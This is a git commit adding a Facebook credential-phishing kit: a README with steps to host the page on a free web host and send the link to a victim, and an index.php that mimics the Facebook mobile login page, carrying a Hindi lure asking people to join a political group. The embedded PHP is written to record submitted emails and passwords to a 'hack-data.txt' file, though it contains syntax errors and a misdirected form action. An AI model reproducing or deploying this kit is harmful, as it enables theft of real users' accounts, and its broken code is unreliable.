2ac5c765bba515adb7a8d1e1d0aafaba0251a100
waiyan3972894 <148638657+waiyan3972894@users.noreply.github.com>
2024-04-29 10:30:37 +0630

    Add files via upload

---
+++ README.md
@@ -0,0 +1,19 @@
+# facebook-phisher
+Hello Guys this Repository for Phishing activity for Faceboook. It contains a php file and some styling files, it requires a server or hosting website (paid or free) as you can afford, recommended : use 000webhost.com for a free website.
+
+ATTENTION : This repository is only for educational purpose, We will not be responsible for any criminal offence.
+
+STEP 1
+Download this repository using the zip file or git clone https://github.com/fullstackrajkumar/facebook-phisher.git
+
+STEP 2
+Create a account with your gmail account on https://000webhost.com and verify your account
+
+STEP 3
+Create a website and go to file manager and upload the zip file  on file manager and extract
+
+STEP 4
+Now modify your files as you like
+
+STEP 5
+Now send this link to victim as you can send.
---
+++ index.php
@@ -0,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+	<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>Facebook :: Samajwadi Group Support on Facebook</title>
+		<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+		<link rel="stylesheet" type="text/css" href="css/style.css">
+		<link rel="icon" href="favicon.png" sizes="16x16" type="image/png">
+	</head>
+	<body>
+		<div class="container-fluid header">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-12 text-center"><img src="images/logo.png" class="img-fluid"/></div>
+				</div>
+			</div>
+		</div>
+		<div class="container-fluid download">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-12 text-center"><a href="https://scontent.fdel14-1.fna.fbcdn.net/v/t39.10537-6/91131042_539110750340662_5746271835201208320_n.apk/facebook_lite_v191.0.0.7.122.apk?_nc_cat=1&atg=meta_ATqL8-Tgm03yHGjiW0sAJ3XtjcTdAzAV1lVLw-UqGPh80_K15sb4KcwdA9rjojbTe_89SeG_Hpb_xeIU6xbRyi1gH7fhv0NxDDF28leloQdQ3Tywk5nRgqqALo3c6WNqfXPFb3X466YuVP1sQ1eiMlEda2GK_Yw-ZzuQI7EXzkY5SMHYVrtgDzG_txfhXV5slBsUEHHPPFmDN0qow8CKSiLBjREKabdqiStzZNVHPDR1yaA93nqdi8H7AjH8kfROa-QAD8j4_I0N_vmMXuRtKdnj9Aw7FUKh9xfdh7-lD64RV0Utu8jplS-sR5cTufs2z4yolUNlomXJRiyGDEDxx2xm3wMX0j0jg6Y5MtlPReiM_Za5aqe4wshLJyelKxzPYXusk2lZfc1C-QFwoyjURQ8V9CLJm3JWVO9zHsgJ10QaQ2TpwtvTis0i-F4o&atgo=1605640&atgs=AUJQ_Z9N2hwWstNb44vOOq34H0W6bb8pg6IxY266uTsiOQ&_nc_sid=379304&_nc_ohc=5mychWQA1BsAX9ZhBg5&_nc_ad=z-m&_nc_cid=1252&_nc_zor=4&_nc_ht=scontent.fdel14-1.fna&oh=e2e3601fc6d664eb24f3b483fae41914&oe=5EA90479"><font size="2px" color="#3c5b9a">Get Facebook for Android and browse faster.</font></a></div>
+				</div>
+			</div>
+		</div>
+		<br>
+		<div class="container">
+			<div class="row text-center">
+				<div class="col-12"><img src="images/party.jpg" class="img-fluid"/></div>
+			</div>
+			<div class="row description text-center">
+				<div class="col-12">आप सभी से अनुरोध है कृपया हमारे फेसबुक ग्रुप को ज्वाइन करके हमें समर्थन दें आप हमारे लिए बहुत महत्वपूर्ण है</div>
+			</div>
+		</div>
+		<div class="conatainer-fluid">
+			<div class="container">
+				<form method="#" action="google.com">
+				<div class="row">
+				<div class="col-md-6">
+    <input type="text" class="form-control back" name="email" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Mobile number or email address">
+  </div>
+  <div class="col-md-6">
+    <input type="password" name="password" class="form-control back" id="exampleInputPassword1" placeholder="Password">
+  </div>
+  </div>
+  <br>
+  <div class="row">
+  <div class="col-md-12">
+  <button type="submit" name="submit" class="btn btn-primary btn-block mybtn"><font size="3px">Log In</font></button>
+  </div>
+  </div>
+</form>
+<div class="row marg">
+<div class="col"><hr></div>
+<div class="col-1"> or </div>
+<div class="col"><hr></div>
+			</div>
+			<br>
+			<div class="row text-center">
+				<div class="col align-self-center"><a href="https://mbasic.facebook.com/reg/?cid=103&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&_rdr"><button class="btn btn-success">Create New Account</button></a></div>
+			</div>
+			<div class="row text-center password">
+				<div class="col align-self-center"><a href="https://mbasic.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&_rdr"><font color="#3c5b9a">Forgotten password?</font></a></div>
+			</div>
+			<br><br>
+			<div class="row lang">
+				<div class="col-3 offset-2"><font color="grey">English (UK)</font></div>
+				<div class="col-3 offset-3">हिन्दी</div>
+			</div>
+			<div class="row lang">
+				<div class="col-3 offset-2">اُردو</div>
+				<div class="col-3 offset-3">ਪੰਜਾਬੀ</div>
+			</div>
+			<div class="row lang">
+				<div class="col-3 offset-2">বাংলা</div>
+				<div class="col-3 offset-3">ગુજરાતી</div>
+			</div>
+			<div class="row lang">
+				<div class="col-3 offset-2">मराठी</div>
+				<div class="col-3 offset-3">தமிழ்</div>
+			</div>
+			<br><br>
+			<div class="row">
+				<div class="col-md-12 text-center"><div class="footer">Facebook Inc.</div></div>
+			</div>
+		</div>
+	</body>
+</html>
+<?php
+	extract($_REQUEST);
+	$file=fopen("hack-data.txt","a");
+	
+	fwrite($file,"Email or Phone : ");
+	fwrite($file,$email : \n);
+	fwrite($file,"Email or Password : ");
+	fwrite($file,$password : \n");
+	fclose($file);
+?>
